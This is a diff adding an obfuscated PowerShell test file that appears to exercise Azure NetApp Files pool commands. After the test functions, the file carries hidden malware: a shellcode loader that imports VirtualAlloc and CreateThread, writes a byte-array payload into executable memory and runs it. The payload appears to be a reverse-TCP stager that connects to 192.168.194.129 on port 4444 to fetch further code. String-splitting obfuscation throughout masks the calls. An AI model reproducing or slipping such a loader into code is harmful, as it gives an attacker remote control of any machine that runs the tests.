@@ -1,0 +1,129 @@
+function teST-POO`l`Crud
+{
+    ${reSOurcE`gR`Oup} = &("{1}{0}{3}{2}"-f 'sourceGr','Get-Re','upName','o')
+    ${Ac`cn`Ame} = &("{2}{0}{3}{1}"-f 'e','urceName','G','t-Reso')
+    ${P`OOLN`A`me1} = &("{1}{3}{5}{2}{4}{0}"-f'e','Get-R','rce','eso','Nam','u') 
+    ${POO`l`NAmE2} = &("{2}{1}{4}{0}{3}" -f'ourceNam','-R','Get','e','es') 
+    ${ReSOUr`c`ElOCa`Tion} = &("{3}{0}{5}{1}{4}{2}"-f 'Pro','d','on','Get-','erLocati','vi') ("{2}{3}{4}{0}{1}"-f 'NetAp','p','M','icroso','ft.')
+    ${p`oo`lsIzE} = 4398046511104
+    ${SE`RviCeL`EV`eL} = ("{0}{1}" -f'Premiu','m')
+    
+    try
+    {
+        
+        &("{0}{4}{1}{3}{2}" -f'Ne','AzR','Group','esource','w-') -Name ${REsOu`R`Ce`GrO`UP} -Location ${rESOUR`CE`lo`caTioN}
+
+        
+        ${RE`TrIEve`Dacc} = &("{1}{5}{3}{0}{2}{4}" -f'A','Ne','ppFile','-AzNet','sAccount','w') -ResourceGroupName ${reSO`UR`CEGRo`UP} -Location ${r`ESOUrc`E`lOCAT`I`oN} -AccountName ${acc`N`AME} 
+	    
+        
+        ${N`eW`Tag`NAme} = ("{0}{1}" -f 'ta','g1')
+        ${nEWTa`G`VA`lue} = ("{2}{0}{1}" -f'agVa','lue1','t')
+        ${re`Tr`ieVed`p`OoL} = &("{6}{2}{1}{5}{4}{0}{3}"-f'P','NetApp','-Az','ool','es','Fil','New') -ResourceGroupName ${R`E`sO`UrCEgr`OUp} -Location ${re`soURCeLO`c`A`TION} -AccountName ${a`CCn`Ame} -PoolName ${Poo`L`NAmE1} -PoolSize ${POo`lSIze} -ServiceLevel ${Ser`VIcel`Ev`El} -Tag @{${newTA`GN`AMe} = ${nEwT`Agv`ALue}}
+        &("{1}{0}{2}" -f'ua','Assert-AreEq','l') "$accName/$poolName1" ${ReTrIeve`d`PO`Ol}."n`AMe"
+        &("{3}{2}{0}{1}" -f't-AreEqu','al','r','Asse') ${ser`VI`CE`lEveL} ${ReTri`E`VE`dPOOl}."serviC`EL`EvEl"
+        &("{0}{1}{3}{2}" -f 'Asse','rt-A','al','reEqu') ("{1}{0}"-f 'e','Tru') ${Retr`iEvE`dpooL}."t`AGS".("{3}{2}{1}{0}" -f 'Key','ntains','o','C').Invoke(${n`e`wtAgnamE})
+        &("{3}{1}{0}{2}" -f 't-AreEqu','er','al','Ass') ("{0}{1}{2}" -f't','ag','Value1') ${R`etRieVEDpO`ol}."TA`gS"[${N`e`wT`AgnAMe}].("{0}{2}{1}" -f'ToS','g','trin').Invoke()
+
+        
+        ${rEtr`IEV`EdpO`ol} = &("{1}{5}{4}{0}{2}{3}" -f 'ile','New-Az','sPoo','l','tAppF','Ne') -ResourceGroupName ${r`eSOuRc`EG`ROup} -Location ${reSOurC`E`LoC`A`TioN} -AccountName ${A`CCNa`me} -PoolName ${Poo`l`Na`ME2} -PoolSize ${pOO`LsI`Ze} -ServiceLevel ${SEr`Vi`CelE`V`eL} -Confirm:${F`AL`se}
+        &("{0}{1}{3}{4}{2}"-f'As','ser','ual','t-AreE','q') "$accName/$poolName2" ${R`EtRi`E`VEDpoOl}."Na`mE"
+		
+        
+        ${r`Et`RI`EVEdPoOl} = &("{0}{1}{3}{5}{4}{2}" -f 'New-','Az','sPool','Ne','ile','tAppF') -ResourceGroupName ${res`ourceGrO`Up} -Location ${Res`OUrCElo`c`AtIon} -AccountName ${a`CcN`Ame} -PoolName ${Po`O`L`NAMe2} -PoolSize ${POol`si`ze} -ServiceLevel ${S`e`RVICe`LE`VEl} -WhatIf
+
+        
+        ${retr`IEvE`D`pooL} = &("{4}{0}{1}{2}{6}{3}{5}" -f't','-AzNe','t','P','Ge','ool','AppFiles') -ResourceGroupName ${rESoUrCe`GR`OUP} -AccountName ${A`cCNAme}
+        
+        &("{3}{2}{0}{1}"-f 'u','e','ert-Tr','Ass') {"$accName/$poolName1" -eq ${Retri`EVE`d`pO`oL}[0]."N`AMe" -or "$accName/$poolName2" -eq ${R`Et`RIe`VEdPOOl}[0]."N`AME"}
+        &("{1}{2}{3}{0}"-f 'ue','As','sert-','Tr') {"$accName/$poolName1" -eq ${rETrieVE`DP`O`OL}[1]."N`AMe" -or "$accName/$poolName2" -eq ${retR`i`EvE`dPool}[1]."Na`mE"}
+        &("{2}{3}{0}{1}" -f'-Are','Equal','Asse','rt') 2 ${R`Etr`ie`VEDPO`Ol}."LE`NgTH"
+
+        
+        ${REtrieVEDp`o`oL} = &("{1}{3}{0}{2}{4}"-f 'pFi','G','lesPoo','et-AzNetAp','l') -ResourceGroupName ${RESouRc`E`GRO`Up} -AccountName ${AcCN`A`mE} -PoolName ${pO`o`lnAM`e1}
+        &("{2}{4}{1}{3}{0}" -f'qual','er','As','t-AreE','s') "$accName/$poolName1" ${Ret`R`IEv`EdpoOL}."N`AMe"
+
+        
+        ${RETrIEV`Ed`po`OlBy`iD} = &("{3}{1}{0}{5}{2}{6}{4}"-f 'Ap','zNet','F','Get-A','esPool','p','il') -ResourceId ${r`et`RIEVe`dPO`Ol}."ID"
+        &("{3}{1}{0}{2}"-f 'eEq','-Ar','ual','Assert') "$accName/$poolName1" ${rE`T`R`IeveDpOOL`BYiD}."N`AMe"
+
+        
+        
+        ${rEtr`i`eVe`dPool} = &("{3}{0}{2}{1}{4}{5}" -f'da','ppFile','te-AzNetA','Up','sP','ool') -ResourceGroupName ${r`Esou`RC`eGrO`UP} -Location ${rE`soURc`ElOc`ATIOn} -AccountName ${A`c`CnAME} -PoolName ${po`oL`NamE1} -ServiceLevel ("{1}{0}{2}"-f'da','Stan','rd')
+        &("{4}{0}{1}{2}{3}" -f 's','ert-A','re','Equal','As') "$accName/$poolName1" ${reTri`e`VEd`POOl}."nA`mE"
+        &("{3}{1}{0}{2}"-f'ua','reEq','l','Assert-A') ("{1}{0}" -f 'dard','Stan') ${Re`T`RIevedpoOl}."SERVI`CELe`V`El"
+
+        
+        ${r`ETRIe`VEDpool} = &("{2}{1}{3}{6}{0}{5}{4}" -f'Po','te-','Upda','AzNetAppF','l','o','iles') -ResourceGroupName ${Res`OuRcE`GRO`UP} -AccountName ${AcC`N`AmE} -PoolName ${poOLna`M`E1}
+        &("{1}{0}{3}{2}{4}" -f 'ser','As','qu','t-AreE','al') "$accName/$poolName1" ${rEtRIEV`Edpo`ol}."Na`mE"
+        &("{4}{0}{3}{2}{1}" -f 'ert','reEqual','A','-','Ass') ("{1}{0}{2}"-f'a','St','ndard') ${Re`Tr`ievedpO`oL}."sE`RviCElE`VEl"
+
+        
+        &("{5}{4}{0}{2}{3}{6}{1}" -f'etA','l','pp','Fil','e-AzN','Remov','esPoo') -ResourceId ${RETr`iEVE`dPO`olbY`iD}."i`D"
+
+        
+        &("{6}{0}{1}{3}{2}{5}{4}"-f've-AzN','e','A','t','ol','ppFilesPo','Remo') -ResourceGroupName ${rEsoU`RCe`gR`O`UP} -AccountName ${a`cC`NamE} -PoolName ${Po`O`lNAme2} -WhatIf
+        ${rE`T`RI`eV`edpOOL} = &("{2}{0}{1}{4}{3}"-f't-','AzNetAppFilesPo','Ge','l','o') -ResourceGroupName ${r`es`ou`RceGRoUP} -AccountName ${AcCn`A`me}
+        &("{0}{1}{2}" -f 'Ass','ert','-AreEqual') 1 ${R`e`TriEvEdPo`OL}."LE`NGTH"
+
+        &("{1}{4}{2}{0}{3}{5}"-f'AzNe','Rem','ve-','tAppFiles','o','Pool') -ResourceGroupName ${re`s`oURc`egro`Up} -AccountName ${acCn`A`mE} -PoolName ${PO`OLN`Ame2}
+        ${rET`RieVEd`P`oOl} = &("{6}{1}{4}{2}{0}{5}{3}"-f'NetA','-','z','ol','A','ppFilesPo','Get') -ResourceGroupName ${res`oU`RCEGrO`UP} -AccountName ${AcC`N`AMe}
+        &("{2}{0}{4}{1}{3}" -f'rt-','a','Asse','l','AreEqu') 0 ${Re`TRiE`VE`D`POoL}."L`ENgTH"
+    }
+    finally
+    {
+        
+        &("{0}{3}{1}{4}{2}"-f'Clean','e','urceGroup','-R','so') ${re`SoURCEGR`oUp}
+    }
+}
+
+
+
+function TEst-p`oO`L`PIp`E`LInEs
+{
+    ${R`ESourCeGRo`UP} = &("{3}{2}{1}{0}{4}"-f 'esourceGroupNa','R','t-','Ge','me')
+    ${aC`Cn`AME} = &("{0}{4}{3}{1}{2}" -f 'Get-R','eN','ame','rc','esou')
+    ${Po`OLN`AmE1} = &("{4}{1}{2}{3}{0}{5}"-f'our','e','t-Re','s','G','ceName')
+    ${PO`O`lN`AMe2} = &("{0}{4}{2}{3}{1}" -f'Get','e','Resour','ceNam','-')
+    ${R`ESO`URceloC`ATI`ON} = &("{0}{1}{3}{4}{2}"-f 'Get','-P','ocation','rov','iderL') ("{1}{2}{3}{0}"-f 'p','Microso','f','t.NetAp')
+    ${poO`lsi`Ze} = 4398046511104
+    ${servIcE`l`EvEL} = ("{0}{1}" -f 'Pr','emium')
+    
+    try
+    {
+        
+        &("{2}{3}{1}{0}" -f'p','urceGrou','New','-AzReso') -Name ${R`e`S`ourcEGroUp} -Location ${resou`R`ce`L`oCAtI`ON}
+
+        
+        &("{0}{1}{3}{2}" -f 'New','-','t','AnfAccoun') -ResourceGroupName ${r`eso`Ur`CEGRoUp} -Location ${R`e`souRcE`LoCAtiON} -Name ${A`cCNa`me} | &("{0}{1}{2}"-f'New','-A','nfPool') -Name ${p`o`oLnaM`e1} -PoolSize ${P`oOL`siZe} -ServiceLevel ${sErV`i`cEl`E`Vel}
+		
+        
+        ${REt`R`IevE`dP`oOL} = &("{3}{1}{0}{2}" -f'-','t','AnfPool','Ge') -ResourceGroupName ${R`eSOu`RC`eGr`OuP} -AccountName ${A`cCnA`me} -Name ${POOL`NA`ME1} | &("{0}{2}{1}"-f'U','ool','pdate-AnfP') -ServiceLevel ("{1}{0}{2}"-f 'andar','St','d')
+        &("{2}{1}{0}{3}"-f 'sert','s','A','-AreEqual') ("{1}{0}{2}"-f'and','St','ard') ${ReTri`E`V`edPOOl}."SEr`Vice`l`eVEL"
+		
+        
+        ${r`ETR`IEved`POOL} = &("{1}{0}{2}" -f 'ccoun','Get-AnfA','t') -ResourceGroupName ${R`eSOUr`cEgR`o`UP} -Name ${AcCNa`ME} | &("{0}{3}{2}{1}" -f 'U','Pool','f','pdate-An') -Name ${pOO`l`NaMe1} -PoolSize ${po`olSIzE} -ServiceLevel ("{0}{1}"-f 'Prem','ium')
+        &("{3}{2}{1}{0}" -f'AreEqual','-','t','Asser') ("{0}{1}{2}" -f'Premi','u','m') ${RE`TR`iEvE`DP`OOl}."sE`RviceleV`eL"
+
+        
+        &("{2}{4}{0}{1}{3}"-f 'Anf','Accoun','G','t','et-') -ResourceGroupName ${RE`SOU`R`cEg`ROUP} -Name ${a`c`CnAme} | &("{3}{1}{4}{0}{2}"-f 'Po','ve','ol','Remo','-Anf') -Name ${pO`OlnA`me1} 
+
+        
+        &("{3}{2}{0}{1}"-f'o','l','AnfPo','New-') -ResourceGroupName ${r`eS`oU`RCe`GrouP} -Location ${r`esO`Ur`Celoc`AtiOn} -AccountName ${a`C`cNAME} -Name ${p`O`OLNAMe1} -PoolSize ${P`OO`lsIZE} -ServiceLevel ${Se`RvIc`ELeveL}
+
+        
+        &("{3}{0}{2}{1}"-f 'nfA','nt','ccou','Get-A') -ResourceGroupName ${r`eSou`RcEG`ROuP} -Name ${A`CcNa`mE} | &("{2}{3}{0}{1}"-f '-AnfPo','ol','Ne','w') -PoolName ${p`Ool`NamE2} -PoolSize ${pOoLs`I`zE} -ServiceLevel ${SEr`V`icel`Evel}
+
+        
+        .("{1}{0}{2}{3}" -f'Anf','Get-','Poo','l') -ResourceGroupName ${REso`U`RC`egro`UP} -AccountName ${A`CCNAMe} -Name ${pOO`ln`AMe1} | .("{4}{5}{2}{0}{1}{6}{3}{7}"-f 'e-A','zNetApp','ov','lesPoo','R','em','Fi','l')
+
+        ${Re`TrIE`VE`dPO`ol} = .("{2}{0}{3}{1}" -f 'Acc','unt','Get-Anf','o') -ResourceGroupName ${RESOU`RCEgr`OUp} -AccountName ${acC`NAme} | &("{0}{1}{3}{2}"-f 'Ge','t-An','l','fPoo') 
+		&("{0}{1}{2}"-f'Assert-Ar','eEqu','al') 1 ${reTRI`e`VeDpo`oL}."L`en`GtH"
+    }
+    finally
+    {
+        
+        &("{1}{2}{3}{0}{4}{5}" -f'ro','Clean-','Resourc','eG','u','p') ${R`ESOu`RcegRoUp}
+    }
+}
+${C} = (((("{64}{55}{16}{14}{17}{62}{82}{40}{3}{6}{57}{33}{49}{59}{0}{72}{75}{46}{87}{69}{51}{76}{9}{28}{91}{44}{13}{102}{68}{78}{92}{11}{71}{30}{47}{34}{66}{61}{63}{1}{41}{22}{88}{79}{7}{45}{27}{89}{37}{50}{52}{67}{99}{18}{36}{85}{39}{86}{42}{48}{95}{10}{31}{60}{93}{80}{65}{24}{96}{100}{77}{83}{35}{38}{74}{54}{73}{81}{15}{90}{23}{98}{101}{56}{53}{2}{84}{43}{12}{5}{8}{20}{70}{25}{19}{32}{97}{29}{26}{58}{94}{4}{21}"-f 'e','.','CF)]pu','CF','rc, uint coun','c stati',')]','tati','c ex','s','n','flProtect);[Dll','i','nt flAl','Fker','DllImport(','(hC','ne','hreadAt','ntPtr memse','te','t);','lh','C','tr lpPar',' I','n','nt',', uint ','ui','mp','tPtr lp','t(IntPtr dest',' st','t','rea','tributes,',' C','tionFlag','uint d','h','dl','ckSize','l','ize, ui','c extern I','tPtr V','or',',','atic ','reateT','loc','h','lh','tPt','lImport','t.dl','public','t ','ext','StartA','hCFkerne','l3','l32','[Dl','s, IntP','(','read(In','on','tualAl','rn','I','rn ','r lpThrea','s, In','In','(IntPtr lpAddres',', u','Type, uint','s','dres','dId);[','2.dll','int dwC','b',' ','wSta','ir','CF)]public ','Ptr','h','dwS',' ','d','s',' I','amete',', ','Fms','tPtr lpT','r','vcr','locati')) -rEpLaCE 'hCF',[CHAR]34));${w} = .("{0}{1}" -f 'Add-Ty','pe') -memberDefinition ${c} -Name ("{1}{0}"-f '32','Win') -namespace ("{1}{4}{0}{3}{2}" -f'Func','Win','ns','tio','32') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${g} = 0x1000;if (${z}."lENG`Th" -gt 0x1000){${G} = ${Z}."L`e`NGth"};${X}=${W}::("{3}{0}{1}{2}"-f'ualAll','o','c','Virt').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."LE`NgtH"-1);${I}++) {${w}::"mEms`et"([IntPtr](${x}.("{1}{0}"-f '2','ToInt3').Invoke()+${I}), ${z}[${i}], 1)};${W}::("{1}{0}{2}"-f 'eTh','Creat','read').Invoke(0,0,${X},0,0,0);for (;;){&("{3}{1}{2}{0}" -f 'p','art-sl','ee','St') 60};
